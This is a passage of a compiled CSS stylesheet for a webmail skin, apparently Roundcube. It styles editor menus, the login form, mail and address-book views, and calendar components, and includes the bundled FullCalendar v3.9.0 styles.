   .mce-window .mce-combobox input {
     max-width: calc(100% - 4rem);
   }
   .mce-window .mce-combobox-fake input {
     max-width: calc(100% - 1.7rem);
   }
   .mce-menu {
     width: 272px !important;
     right: 0;
     top: 0 !important;
     left: auto !important;
     height: 100% !important;
     max-height: unset !important;
     padding: 0 !important;
     margin: 0 !important;
     border-radius: 0;
     border: 0 !important;
   }
   .mce-menu .popover-header {
     display: block !important;
   }
   .mce-menu .popover-header a {
     font-size: 1.2rem;
     line-height: 58px;
   }
   .mce-menu .popover-header a:before {
     content: "\f00d";
   }
   .mce-menu .mce-container-body {
     width: 100% !important;
   }
   .mce-menu .mce-menu-item {
     height: 47px;
     line-height: 47px;
     padding: 0 0.5rem;
     border-left: 0;
     border-bottom: 1px solid #f1f3f4;
     margin: 0;
   }
   .mce-menu .mce-menu-item .mce-ico {
     font-size: 150%;
     padding: 0 0.7rem 0 0.25rem;
     margin-top: -0.2rem;
   }
   .mce-menu .mce-menu-item .mce-text {
     font-size: 1.2rem;
     font-family: Roboto, sans-serif;
     line-height: 47px;
     color: #2c363a;
   }
   .mce-menu .mce-menu-item .mce-caret {
     display: none;
   }
   .mce-menu .mce-menu-item.mce-menu-item-preview.mce-active {
     border-left: none;
     position: relative;
   }
   .mce-menu .mce-menu-item.mce-menu-item-preview.mce-active:after {
     font-size: 1.25em;
     display: block;
     float: left;
     margin: 0 0.25rem 0 0;
     width: 1.18em;
     height: 1em;
     font-family: 'Icons';
     font-style: normal;
     font-weight: 900;
     text-decoration: inherit;
     text-align: center;
     speak: none;
     font-smoothing: antialiased;
     -moz-osx-font-smoothing: grayscale;
     -webkit-font-smoothing: antialiased;
     content: "\f00c";
     position: absolute;
     right: 0.5rem;
     top: 0;
     color: #2c363a;
   }
   .mce-menu .mce-menu-item.mce-menu-item-expand {
     position: relative;
   }
   .mce-menu .mce-menu-item.mce-menu-item-expand:after {
     font-size: 1.25em;
     display: block;
     float: left;
     margin: 0 0.25rem 0 0;
     width: 1.18em;
     height: 1em;
     font-family: 'Icons';
     font-style: normal;
     font-weight: 900;
     text-decoration: inherit;
     text-align: center;
     speak: none;
     font-smoothing: antialiased;
     -moz-osx-font-smoothing: grayscale;
     -webkit-font-smoothing: antialiased;
     content: "\f105";
     position: absolute;
     right: 0.5rem;
     top: 0;
     color: #2c363a;
   }
   .mce-menu-item-sep,
   .mce-menu-shortcut {
     display: none !important;
   }
   .mce-charmap-dialog {
     position: unset !important;
   }
   .mce-charmap-dialog + .mce-container {
     display: none;
   }
   .mce-charmap {
     display: block;
   }
   .mce-charmap tbody {
     display: block;
   }
   .mce-charmap tr {
     display: flex;
     flex-wrap: wrap;
   }
   .mce-charmap td {
     flex: 1;
     height: auto !important;
     min-width: 17%;
     padding: 0 !important;
     border: 0 !important;
     border-bottom: 1px solid #f1f3f4 !important;
   }
   .mce-charmap td div {
     font-size: 3rem;
     line-height: 2;
   }
 }
 html.touch .mce-grid td {
   padding: 0.5rem;
 }
 /*** Media file selector for TinyMCE ***/
 .image-selector {
   margin: 1rem 1rem 1rem 1rem !important;
   padding: 1rem 0.5rem 10rem 0.5rem !important;
 }
 .image-selector.droptarget {
   border: 0.2rem dashed #d4dbde;
 }
 .image-selector.droptarget:after {
   margin-top: 2rem;
 }
 .image-selector button {
   color: #fff;
   background: #8b9fa7;
   border-color: #8b9fa7;
   padding: 0.5rem 0.75rem;
   line-height: 1.5;
   position: relative;
 }
 .image-selector button:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.5);
 }
 .image-selector button:hover {
   background: #7c939c;
   border-color: #778e98;
 }
 .image-selector button.disabled,
 .image-selector button:disabled {
   background: #c5cfd3;
   border-color: #c5cfd3;
   opacity: 1;
 }
 .image-selector button:not(:disabled):not(.disabled):active,
 .image-selector button:not(:disabled):not(.disabled).active {
   background: #6e8791;
   border-color: #6a828b;
 }
 .image-selector button:not(:disabled):not(.disabled):active:focus,
 .image-selector button:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.53);
 }
 .image-selector button:before {
   line-height: 1;
 }
 .image-selector form {
   position: absolute;
   top: 0;
 }
 .image-selector .attachmentslist {
   margin-left: 0;
   overflow-x: hidden;
   overflow-y: auto;
   height: 19.1em;
 }
 .image-selector .attachmentslist li {
   padding: 0.25rem;
   cursor: pointer;
 }
 .image-selector .attachmentslist li:before {
   display: none;
 }
 .image-selector .attachmentslist li:hover,
 .image-selector .attachmentslist li:focus {
   background: #0099cc;
 }
 .image-selector .attachmentslist li span.name {
   flex: 1;
   margin: auto;
   padding-left: 1rem;
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .image-selector .attachmentslist li span.img {
   height: 80px;
   width: 80px;
   display: flex;
   border: 1px solid #f1f3f4;
   background: white;
   border-radius: 0.75rem;
   overflow: hidden;
 }
 .image-selector .attachmentslist li img {
   margin: auto;
 }
 html.layout-phone .image-selector .attachmentslist {
   height: auto;
 }
 /*** HTML editor widget ***/
 .html-editor {
   position: relative;
   display: flex;
   margin-bottom: 0.25rem;
 }
 .html-editor > .nav {
   border-color: transparent;
   z-index: 1;
   position: absolute;
   right: 1rem;
 }
 .html-editor > .nav a.active {
   border-color: #ced4da !important;
 }
 .html-editor > .nav a.active.mode-html {
   background-color: #f1f3f4;
   border-bottom-color: #f1f3f4 !important;
 }
 .html-editor > .nav a.active.mode-plain {
   border-bottom-color: #fff !important;
 }
 .html-editor > .nav a:hover,
 .html-editor > .nav a:focus {
   border-bottom-color: transparent;
   outline: 0;
 }
 .html-editor > iframe,
 .html-editor > .googie_edit_layer,
 .html-editor > .mce-tinymce,
 .html-editor > textarea {
   margin-top: 2.55rem;
   font-family: monospace;
   width: 100% !important;
 }
 .html-editor > iframe {
   border-radius: 0.3rem;
   border: 1px solid #ced4da;
   min-height: 30em;
 }
 .html-editor #composebody_ifr {
   min-height: 30em;
 }
 .html-editor > .mce-tinymce.focused {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25) !important;
 }
 /*** GoogieSpell widget ***/
 .googie_window {
   width: 16rem;
   height: auto;
 }
 .googie_edit_layer {
   font-family: monospace;
   padding: 0.5rem 0.75rem;
   border: 1px solid #ced4da;
   border-radius: 0.3rem;
   line-height: 1.25;
 }
 .googie_link {
   color: #EC1313;
   text-decoration: underline;
   cursor: pointer;
 }
 .googie_list li {
   min-width: 8rem;
   width: auto;
 }
 .googie_list li.googie_list_onhover {
   color: #fff;
   background-color: #0099cc;
 }
 .googie_list li .googie_list_revert:before {
   content: "\f0e2";
 }
 .googie_list li .googie_add_to_dict:before {
   content: "\f0fe";
 }
 .googie_list input {
   display: inline-block;
   margin: 0.25rem 0.5rem;
 }
 /*** Login form ***/
 .task-login #layout-content {
   text-align: center;
   width: 100%;
   display: block;
 }
 .task-login #logo {
   display: inline-block;
   position: relative;
   top: 16vh;
   max-height: 100px;
 }
 #login-form {
   margin: 0 auto;
   top: 20vh;
   width: 95%;
   max-width: 320px;
   position: relative;
 }
 #login-form table,
 #login-form tbody {
   display: block;
 }
 #login-form .row {
   margin-right: 0;
   margin-left: 0;
 }
 #rcmloginsubmit:before {
   display: none !important;
 }
 #login-footer {
   flex: 1;
   color: #737677;
 }
 #login-footer > div {
   margin-top: 1rem;
   padding: 1rem;
   background: #f1f3f4;
   border-radius: 0.3rem;
 }
 #login-addon {
   position: absolute;
   bottom: 0;
   max-height: 30%;
   margin: 1rem !important;
   width: auto !important;
   overflow: auto;
 }
 @media screen and (min-width: 769px) {
   #login-addon {
     max-width: 768px;
     margin: auto !important;
     bottom: 1rem;
     left: 0;
     right: 0;
   }
 }
 body.task-error-login #layout #layout-menu,
 body.task-error-login #layout #layout-content > .header {
   display: none;
 }
 /*** Addressbook UI ***/
 #contactpic {
   width: 112px;
   height: 135px;
   border-radius: 0.5rem;
   overflow: hidden;
   display: table-cell;
   vertical-align: middle;
   text-align: center;
   background-color: #f4f4f4;
 }
 #contactpic img {
   max-width: 112px;
   max-height: 135px;
 }
 #contacthead .names {
   margin-bottom: 0.5rem;
 }
 #contacthead .names span.namefield {
   font-size: 1.5rem;
   font-weight: bold;
   line-height: 1.2;
 }
 #contacthead.readonly .source.row {
   color: #737677;
   font-size: 90%;
   margin-bottom: 0.25rem;
 }
 /*** Mail UI ***/
 #message-header {
   margin-bottom: 1rem;
 }
 #message-header .subject {
   font-size: 1.5rem;
   font-weight: bold;
 }
 body.status-flagged #message-header .subject:before {
   display: inline;
   float: none;
   content: "\f024";
   font-size: 1em;
   color: #EC1313;
 }
 #message-header .subject a.extwin:before {
   float: none;
   display: inline-block;
   font-size: 75%;
   line-height: 1.5;
   margin: 0;
   content: "\f360";
 }
 #message-header .subject span.inner {
   display: none;
 }
 #message-header .short-header {
   display: flex;
 }
 #message-header .short-header img.contactphoto {
   margin: 0 1rem 0 0;
   border-radius: 50%;
   width: 4rem;
   height: 4rem;
 }
 #message-header .short-header div.header-content {
   min-height: 4rem;
   flex: 1;
 }
 #message-header .short-header div.header-subject {
   line-height: 2rem;
 }
 #message-header .short-header div.header-subject > span {
   line-height: 1.5;
   display: inline-block;
   vertical-align: middle;
 }
 #message-header .short-header div.header-links a {
   font-size: 90%;
   margin-right: 0.5rem;
   text-decoration: none;
   white-space: nowrap;
   display: inline-block;
 }
 #message-header .short-header div.header-links a:before {
   height: 1.5rem;
   line-height: 1.3;
 }
 #message-header .short-header div.header-links a.envelope:before {
   content: "\f0e0";
 }
 #message-header .short-header div.header-links a.html:before {
   content: "\f03e";
 }
 #message-header .short-header div.header-links a.plain:before {
   content: "\f039";
 }
 #message-header .short-header div.header-links a.zipdownload:before {
   content: "\f019";
 }
 #message-header .short-header .message-partheaders {
   margin: 0 !important;
   padding: 0.25rem 0 !important;
 }
 #message-header a.extwin,
 #message-header a.headers {
   text-decoration: none;
 }
 #message-content .attachmentslist:not(:empty) {
   margin-bottom: 1rem;
 }
 #messagebody.mailvelope {
   margin: 0;
 }
 #messagebody.mailvelope iframe {
   min-height: 75vh;
 }
 .message-part,
 .message-htmlpart {
   padding-top: 0.5rem;
   position: relative;
 }
 .message-part:not(:first-child),
 .message-htmlpart:not(:first-child) {
   border-top: 1px solid #f5f5f5;
   margin-top: 0.5rem;
 }
 .message-part div.rcmBody,
 .message-htmlpart div.rcmBody {
   margin: 0 !important;
 }
 .message-part blockquote,
 .message-htmlpart blockquote {
   overflow: hidden;
   text-overflow: ellipsis;
   color: #002633;
   border-left: 2px solid #002633;
   border-right: 2px solid #002633;
   background-color: rgba(241, 243, 244, 0.5);
   margin: 2px 0;
   padding: 0 0.4em;
 }
 .message-part blockquote blockquote,
 .message-htmlpart blockquote blockquote {
   color: #205a24;
   border-left: 2px solid #205a24;
   border-right: 2px solid #205a24;
 }
 .message-part blockquote blockquote blockquote,
 .message-htmlpart blockquote blockquote blockquote {
   color: #8e0b0b;
   border-left: 2px solid #8e0b0b;
   border-right: 2px solid #8e0b0b;
 }
 .message-part blockquote span.blockquote-link,
 .message-htmlpart blockquote span.blockquote-link {
   top: 0;
   cursor: pointer;
   right: 0.5rem;
   min-width: 4rem;
   padding: 0.2rem 0.25rem 0.2rem 0.5rem;
   font-size: 90%;
   text-align: center;
   color: #737677;
   background: #f1f3f4;
   border: 1px solid #d4dbde;
   border-radius: 0.3rem;
   line-height: 1;
   font-family: Roboto, sans-serif;
 }
 .message-part blockquote span.blockquote-link:after,
 .message-htmlpart blockquote span.blockquote-link:after {
   content: "\f107";
   display: inline-block;
   float: none;
   margin: 0;
   font-size: 90%;
 }
 .message-part blockquote span.blockquote-link.collapsed:after,
 .message-htmlpart blockquote span.blockquote-link.collapsed:after {
   content: "\f106";
 }
 .message-part blockquote.blockquote-header,
 .message-htmlpart blockquote.blockquote-header {
   text-overflow: ellipsis !important;
   padding-right: 5rem !important;
 }
 .message-part span.sig {
   color: #737677;
 }
 .message-part div.pre {
   font-family: monospace;
 }
 .message-partheaders {
   padding: 0.5rem 0;
   margin: 0.5rem 0 0 0;
   font-size: 90%;
   border-top: 1px solid #f1f3f4;
   border-bottom: 1px solid #f1f3f4;
   color: #737677;
 }
 .message-partheaders .header-title {
   overflow: hidden;
   text-overflow: ellipsis;
   white-space: nowrap;
   max-width: 8em;
   font-weight: bold;
   padding-right: 1rem;
   vertical-align: top;
 }
 .message-partheaders .subject {
   font-weight: bold;
 }
 .message-partheaders + .message-part,
 .message-partheaders + .message-htmlpart {
   border-top: 0;
   margin: 0;
 }
 #compose-attachments {
   margin: 1rem 1rem 0 1rem;
 }
 #composestatusbar {
   position: absolute;
   opacity: 0.3;
 }
 @media screen and (min-width: 769px) {
   #composestatusbar {
     display: none;
   }
 }
 #composestatusbar a.button {
   display: inline-block;
   height: 2.5rem;
   margin-right: 0.25rem;
 }
 #composestatusbar a.button:before {
   line-height: 2.5rem;
 }
 /*** Settings UI ***/
 .settings-default-icon tr > td.section::before,
 .settings-default-icon li > a:before {
   content: "\f013";
 }
 /* more accessible red */
 /* main highlight colour - message counts and quota bar - (old:Secondary Highlight)*/
 /* sidebar background colour - (old:Background Color)*/
 /* top navbar background color - (old:Sidebar Background)*/
 /* selected folder colour - (old:Primary Highlight)*/
 body ul.treelist li.selected > a {
   color: inherit;
   background-color: #0099cc;
 }
 /* text colours for sidebar - (old: Menu Text)*/
 /* this is for the compose button */
 /* this is for the rest */
 /* if bottom footer ad, adjust size */
 @media screen and (min-width: 481px) {
   #taskmenu .special-buttons {
     bottom: 0px;
   }
 }
 /* colors in fsd plugin */
 #layout #fsd_dirs li.sel > span.click {
   background-color: #0099cc;
 }
 .menu a.calendarlink:before {
   content: "\f073";
 }
 .menu a.send:before {
   content: "\f1d8";
 }
 .listing.iconized li.resource > i:before {
   content: "\f1b2";
 }
 a.button.today:before {
   content: "\f133";
   font-weight: 400;
 }
 a.button.date:before {
   content: "\f073";
   font-weight: 400;
 }
 .listing li > div.calendar .calname:before {
   content: "\f073";
 }
 .listing li > div.calendar .actions {
   padding-right: 0.25rem;
 }
 .listing li > div.calendar .actions :last-child {
   margin-right: 0;
 }
 .listing li > div.calendar.cal---invitation--pending .calname:before,
 .listing li > div.calendar.cal---invitation--declined .calname:before {
   content: "\f073";
   font-weight: 400;
 }
 .listing li > div.calendar.cal-__bdays__ .calname:before {
   content: "\f1fd";
 }
 .listing li > div.calendar.cal---invitation--pending,
 .listing li > div.calendar.cal---invitation--declined,
 .listing li > div.calendar.cal-__bdays__ {
   font-style: italic;
 }
 .listing li > div.calendar.cal---invitation--pending a.calname,
 .listing li > div.calendar.cal---invitation--declined a.calname,
 .listing li > div.calendar.cal-__bdays__ a.calname {
   padding-right: 2.5em;
 }
 .listing li > div.calendar.cal---invitation--pending .count,
 .listing li > div.calendar.cal---invitation--declined .count,
 .listing li > div.calendar.cal-__bdays__ .count {
   right: 4.2em;
   font-style: normal;
 }
 .listing li span.handle {
   display: none;
 }
 #calendarcategories .input-group:not(:last-child) {
   margin-bottom: 0.25rem;
 }
 fieldset.categories .input-group .minicolors-input {
   border-radius: 0;
 }
 fieldset.categories .input-group .minicolors + .input-group-append {
   margin-left: 0;
 }
 fieldset.categories .input-group a.button.create:before {
   content: "\f067";
   line-height: 1;
 }
 .calendar-invitebox > i.icon:before {
   content: "\f133" !important;
 }
 .calendar-agenda-preview {
   display: none;
   margin-top: 0.5rem;
   border-top: 1px solid #ddd;
 }
 .calendar-agenda-preview h3 {
   margin-top: 0.5rem;
 }
 .calendar-agenda-preview .event-row {
   white-space: nowrap;
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .calendar-agenda-preview .event-row.current {
   color: #333;
   font-weight: bold;
 }
 .calendar-agenda-preview .event-row.no-event {
   font-style: italic;
 }
 .calendar-agenda-preview .event-row.fc-invitation-needs-action {
   color: #737677;
 }
 .calendar-agenda-preview .event-row.fc-invitation-needs-action .event-title {
   font-style: italic;
 }
 .calendar-agenda-preview .event-title {
   padding-left: 0.5rem;
 }
 #calendar.content {
   overflow: hidden !important;
   position: relative;
 }
 .calendar-datepicker .ui-datepicker {
   margin: 0 !important;
   border: 0;
   border-radius: 0;
   width: auto;
   min-width: auto !important;
   font-size: 0.9rem;
   background-color: #f1f3f4;
 }
 .calendar-datepicker .ui-datepicker table {
   margin: 0;
 }
 .calendar-datepicker .ui-datepicker td a {
   font-size: 0.9rem !important;
 }
 .calendar-datepicker .ui-datepicker-header {
   background-color: #f1f3f4;
   border-top: 1px solid #d4dbde;
 }
 .ui-dialog .calendar-datepicker .ui-datepicker {
   background: transparent;
 }
 .ui-dialog .calendar-datepicker .ui-datepicker-header {
   background: transparent;
   border: 0;
 }
 .ui-dialog .calendar-datepicker td a {
   line-height: 3em !important;
   font-size: 1rem !important;
 }
 /*
  * FullCalendar v3.9.0
  * Docs & License: https://fullcalendar.io/
  * (c) 2018 Adam Shaw
  */
 .fc {
   direction: ltr;
   text-align: left;
 }
 .fc-rtl {
   text-align: right;
 }
 body .fc {
   /* extra precedence to overcome jqui */
   font-size: 1em;
 }
 /* Colors
 --------------------------------------------------------------------------------------------------*/
 .fc-highlight {
   /* when user is selecting cells */
   background: #bce8f1;
   opacity: 0.3;
 }
 .fc-bgevent {
   /* default look for background events */
   background: #8fdf82;
   opacity: 0.3;
 }
 .fc-nonbusiness {
   /* default look for non-business-hours areas */
   /* will inherit .fc-bgevent's styles */
   background: #d7d7d7;
 }
 /* Buttons (styled <button> tags, normalized to work cross-browser)
 --------------------------------------------------------------------------------------------------*/
 .fc button {
   /* force height to include the border and padding */
   -moz-box-sizing: border-box;
   -webkit-box-sizing: border-box;
   box-sizing: border-box;
   /* dimensions */
   margin: 0;
   height: 2.1em;
   padding: 0 0.6em;
   /* text & cursor */
   font-size: 1em;
   /* normalize */
   white-space: nowrap;
   cursor: pointer;
 }
 /* Firefox has an annoying inner border */
 .fc button::-moz-focus-inner {
   margin: 0;
   padding: 0;
 }
 .fc-state-default {
   /* non-theme */
   border: 1px solid;
 }
 .fc-state-default.fc-corner-left {
   /* non-theme */
   border-top-left-radius: 4px;
   border-bottom-left-radius: 4px;
 }
 .fc-state-default.fc-corner-right {
   /* non-theme */
   border-top-right-radius: 4px;
   border-bottom-right-radius: 4px;
 }
 /* icons in buttons */
 .fc button .fc-icon {
   /* non-theme */
   position: relative;
   top: -0.05em;
   /* seems to be a good adjustment across browsers */
   margin: 0 0.2em;
   vertical-align: middle;
 }
 /*
   button states
   borrowed from twitter bootstrap (http://twitter.github.com/bootstrap/)
 */
 .fc-state-default {
   background-color: #f5f5f5;
   background-image: -moz-linear-gradient(top, #ffffff, #e6e6e6);
   background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#ffffff), to(#e6e6e6));
   background-image: -webkit-linear-gradient(top, #ffffff, #e6e6e6);
   background-image: -o-linear-gradient(top, #ffffff, #e6e6e6);
   background-image: linear-gradient(to bottom, #ffffff, #e6e6e6);
   background-repeat: repeat-x;
   border-color: #e6e6e6 #e6e6e6 #bfbfbf;
   border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);
   color: #333;
   text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
   box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
 }
 .fc-state-hover,
 .fc-state-down,
 .fc-state-active,
 .fc-state-disabled {
   color: #333333;
   background-color: #e6e6e6;
 }
 .fc-state-hover {
   color: #333333;
   text-decoration: none;
   background-position: 0 -15px;
   -webkit-transition: background-position 0.1s linear;
   -moz-transition: background-position 0.1s linear;
   -o-transition: background-position 0.1s linear;
   transition: background-position 0.1s linear;
 }
 .fc-state-down,
 .fc-state-active {
   background-color: #cccccc;
   background-image: none;
   box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05);
 }
 .fc-state-disabled {
   cursor: default;
   background-image: none;
   opacity: 0.65;
   box-shadow: none;
 }
 /* Buttons Groups
 --------------------------------------------------------------------------------------------------*/
 .fc-button-group {
   display: inline-block;
 }
 /*
 every button that is not first in a button group should scootch over one pixel and cover the
 previous button's border...
 */
 .fc .fc-button-group > * {
   /* extra precedence b/c buttons have margin set to zero */
   float: left;
   margin: 0 0 0 -1px;
 }
 .fc .fc-button-group > :first-child {
   /* same */
   margin-left: 0;
 }
 /* Popover
 --------------------------------------------------------------------------------------------------*/
 .fc-popover {
   position: absolute;
   box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
 }
 .fc-popover .fc-header {
   /* TODO: be more consistent with fc-head/fc-body */
   padding: 2px 4px;
 }
 .fc-popover .fc-header .fc-title {
   margin: 0 2px;
 }
 .fc-popover .fc-header .fc-close {
   cursor: pointer;
 }
 .fc-ltr .fc-popover .fc-header .fc-title,
 .fc-rtl .fc-popover .fc-header .fc-close {
   float: left;
 }
 .fc-rtl .fc-popover .fc-header .fc-title,
 .fc-ltr .fc-popover .fc-header .fc-close {
   float: right;
 }
 /* Misc Reusable Components
 --------------------------------------------------------------------------------------------------*/
 .fc-divider {
   border-style: solid;
   border-width: 1px;
 }
 hr.fc-divider {
   height: 0;
   margin: 0;
   padding: 0 0 2px;
   /* height is unreliable across browsers, so use padding */
   border-width: 1px 0;
 }
 .fc-clear {
   clear: both;
 }
 .fc-bg,
 .fc-bgevent-skeleton,
 .fc-highlight-skeleton,
 .fc-helper-skeleton {
   /* these element should always cling to top-left/right corners */
   position: absolute;
   top: 0;
   left: 0;
   right: 0;
 }
 .fc-bg {
   bottom: 0;
   /* strech bg to bottom edge */
 }
 .fc-bg table {
   height: 100%;
   /* strech bg to bottom edge */
 }
 /* Tables
 --------------------------------------------------------------------------------------------------*/
 .fc table {
   width: 100%;
   box-sizing: border-box;
   /* fix scrollbar issue in firefox */
   table-layout: fixed;
   border-collapse: collapse;
   border-spacing: 0;
   font-size: 1em;
   /* normalize cross-browser */
 }
 .fc th {
   text-align: center;
 }
 .fc th,
 .fc td {
   border-style: solid;
   border-width: 1px;
   padding: 0;
   vertical-align: top;
 }
 .fc td.fc-today {
   border-style: double;
   /* overcome neighboring borders */
 }
 /* Internal Nav Links
 --------------------------------------------------------------------------------------------------*/
 a[data-goto] {
   cursor: pointer;
 }
 a[data-goto]:hover {
   text-decoration: underline;
 }
 /* Fake Table Rows
 --------------------------------------------------------------------------------------------------*/
 .fc .fc-row {
   /* extra precedence to overcome themes w/ .ui-widget-content forcing a 1px border */
   /* no visible border by default. but make available if need be (scrollbar width compensation) */
   border-style: solid;
   border-width: 0;
 }
 .fc-row table {
   /* don't put left/right border on anything within a fake row.
      the outer tbody will worry about this */
   border-left: 0 hidden transparent;
   border-right: 0 hidden transparent;
   /* no bottom borders on rows */
   border-bottom: 0 hidden transparent;
 }
 .fc-row:first-child table {
   border-top: 0 hidden transparent;
   /* no top border on first row */
 }
 /* Day Row (used within the header and the DayGrid)
 --------------------------------------------------------------------------------------------------*/
 .fc-row {
   position: relative;
 }
 .fc-row .fc-bg {
   z-index: 1;
 }
 /* highlighting cells & background event skeleton */
 .fc-row .fc-bgevent-skeleton,
 .fc-row .fc-highlight-skeleton {
   bottom: 0;
   /* stretch skeleton to bottom of row */
 }
 .fc-row .fc-bgevent-skeleton table,
 .fc-row .fc-highlight-skeleton table {
   height: 100%;
   /* stretch skeleton to bottom of row */
 }
 .fc-row .fc-highlight-skeleton td,
 .fc-row .fc-bgevent-skeleton td {
   border-color: transparent;
 }
 .fc-row .fc-bgevent-skeleton {
   z-index: 2;
 }
 .fc-row .fc-highlight-skeleton {
   z-index: 3;
 }
 /*
 row content (which contains day/week numbers and events) as well as "helper" (which contains
 temporary rendered events).
 */
 .fc-row .fc-content-skeleton {
   position: relative;
   z-index: 4;
   padding-bottom: 2px;
   /* matches the space above the events */
 }
 .fc-row .fc-helper-skeleton {
   z-index: 5;
 }
 .fc .fc-row .fc-content-skeleton table,
 .fc .fc-row .fc-content-skeleton td,
 .fc .fc-row .fc-helper-skeleton td {
   /* see-through to the background below */
   /* extra precedence to prevent theme-provided backgrounds */
   background: none;
   /* in case <td>s are globally styled */
   border-color: transparent;
 }
 .fc-row .fc-content-skeleton td,
 .fc-row .fc-helper-skeleton td {
   /* don't put a border between events and/or the day number */
   border-bottom: 0;
 }
 .fc-row .fc-content-skeleton tbody td,
 .fc-row .fc-helper-skeleton tbody td {
   /* don't put a border between event cells */
   border-top: 0;
 }
 /* Scrolling Container
 --------------------------------------------------------------------------------------------------*/
 .fc-scroller {
   -webkit-overflow-scrolling: touch;
 }
 /* TODO: move to agenda/basic */
 .fc-scroller > .fc-day-grid,
 .fc-scroller > .fc-time-grid {
   position: relative;
   /* re-scope all positions */
   width: 100%;
   /* hack to force re-sizing this inner element when scrollbars appear/disappear */
 }
 /* Global Event Styles
 --------------------------------------------------------------------------------------------------*/
 .fc-event {
   position: relative;
   /* for resize handle and other inner positioning */
   display: block;
   /* make the <a> tag block */
   font-size: 0.85em;
   line-height: 1.3;
   border-radius: 3px;
   border: 1px solid #3a87ad;
   /* default BORDER color */
 }
 .fc-event,
 .fc-event-dot {
   background-color: #3a87ad;
   /* default BACKGROUND color */
 }
 .fc-event,
 .fc-event:hover {
   color: #fff;
   /* default TEXT color */
   text-decoration: none;
   /* if <a> has an href */
 }
 .fc-event[href],
 .fc-event.fc-draggable {
   cursor: pointer;
   /* give events with links and draggable events a hand mouse pointer */
 }
 .fc-not-allowed,
 .fc-not-allowed .fc-event {
   /* to override an event's custom cursor */
   cursor: not-allowed;
 }
 .fc-event .fc-bg {
   /* the generic .fc-bg already does position */
   z-index: 1;
   background: #fff;
   opacity: 0.25;
 }
 .fc-event .fc-content {
   position: relative;
   z-index: 2;
 }
 /* resizer (cursor AND touch devices) */
 .fc-event .fc-resizer {
   position: absolute;
   z-index: 4;
 }
 /* resizer (touch devices) */
 .fc-event .fc-resizer {
   display: none;
 }
 .fc-event.fc-allow-mouse-resize .fc-resizer,
 .fc-event.fc-selected .fc-resizer {
   /* only show when hovering or selected (with touch) */
   display: block;
 }
 /* hit area */
 .fc-event.fc-selected .fc-resizer:before {
   /* 40x40 touch area */
   content: "";
   position: absolute;
   z-index: 9999;
   /* user of this util can scope within a lower z-index */
   top: 50%;
   left: 50%;
   width: 40px;
   height: 40px;
   margin-left: -20px;
   margin-top: -20px;
 }
 /* Event Selection (only for touch devices)
 --------------------------------------------------------------------------------------------------*/
 .fc-event.fc-selected {
   z-index: 9999 !important;
   /* overcomes inline z-index */
   box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
 }
 .fc-event.fc-selected.fc-dragging {
   box-shadow: 0 2px 7px rgba(0, 0, 0, 0.3);
 }
 /* Horizontal Events
 --------------------------------------------------------------------------------------------------*/
 /* bigger touch area when selected */
 .fc-h-event.fc-selected:before {
   content: "";
   position: absolute;
   z-index: 3;
   /* below resizers */
   top: -10px;
   bottom: -10px;
   left: 0;
   right: 0;
 }
 /* events that are continuing to/from another week. kill rounded corners and butt up against edge */
 .fc-ltr .fc-h-event.fc-not-start,
 .fc-rtl .fc-h-event.fc-not-end {
   margin-left: 0;
   border-left-width: 0;
   padding-left: 1px;
   /* replace the border with padding */
   border-top-left-radius: 0;
   border-bottom-left-radius: 0;
 }
 .fc-ltr .fc-h-event.fc-not-end,
 .fc-rtl .fc-h-event.fc-not-start {
   margin-right: 0;
   border-right-width: 0;
   padding-right: 1px;
   /* replace the border with padding */
   border-top-right-radius: 0;
   border-bottom-right-radius: 0;
 }
 /* resizer (cursor AND touch devices) */
 /* left resizer  */
 .fc-ltr .fc-h-event .fc-start-resizer,
 .fc-rtl .fc-h-event .fc-end-resizer {
   cursor: w-resize;
   left: -1px;
   /* overcome border */
 }
 /* right resizer */
 .fc-ltr .fc-h-event .fc-end-resizer,
 .fc-rtl .fc-h-event .fc-start-resizer {
   cursor: e-resize;
   right: -1px;
   /* overcome border */
 }
 /* resizer (mouse devices) */
 .fc-h-event.fc-allow-mouse-resize .fc-resizer {
   width: 7px;
   top: -1px;
   /* overcome top border */
   bottom: -1px;
   /* overcome bottom border */
 }
 /* resizer (touch devices) */
 .fc-h-event.fc-selected .fc-resizer {
   /* 8x8 little dot */
   border-radius: 4px;
   border-width: 1px;
   width: 6px;
   height: 6px;
   border-style: solid;
   border-color: inherit;
   background: #fff;
   /* vertically center */
   top: 50%;
   margin-top: -4px;
 }
 /* left resizer  */
 .fc-ltr .fc-h-event.fc-selected .fc-start-resizer,
 .fc-rtl .fc-h-event.fc-selected .fc-end-resizer {
   margin-left: -4px;
   /* centers the 8x8 dot on the left edge */
 }
 /* right resizer */
 .fc-ltr .fc-h-event.fc-selected .fc-end-resizer,
 .fc-rtl .fc-h-event.fc-selected .fc-start-resizer {
   margin-right: -4px;
   /* centers the 8x8 dot on the right edge */
 }
 /* DayGrid events
 ----------------------------------------------------------------------------------------------------
 We use the full "fc-day-grid-event" class instead of using descendants because the event won't
 be a descendant of the grid when it is being dragged.
 */
 .fc-day-grid-event {
   margin: 1px 2px 0;
   /* spacing between events and edges */
   padding: 0 1px;
 }
 tr:first-child > td > .fc-day-grid-event {
   margin-top: 2px;
   /* a little bit more space before the first event */
 }
 .fc-day-grid-event.fc-selected:after {
   content: "";
   position: absolute;
   z-index: 1;
   /* same z-index as fc-bg, behind text */
   /* overcome the borders */
   top: -1px;
   right: -1px;
   bottom: -1px;
   left: -1px;
   /* darkening effect */
   background: #000;
   opacity: 0.25;
 }
 .fc-day-grid-event .fc-content {
   /* force events to be one-line tall */
   white-space: nowrap;
   overflow: hidden;
 }
 .fc-day-grid-event .fc-time {
   font-weight: bold;
 }
 /* resizer (cursor devices) */
 /* left resizer  */
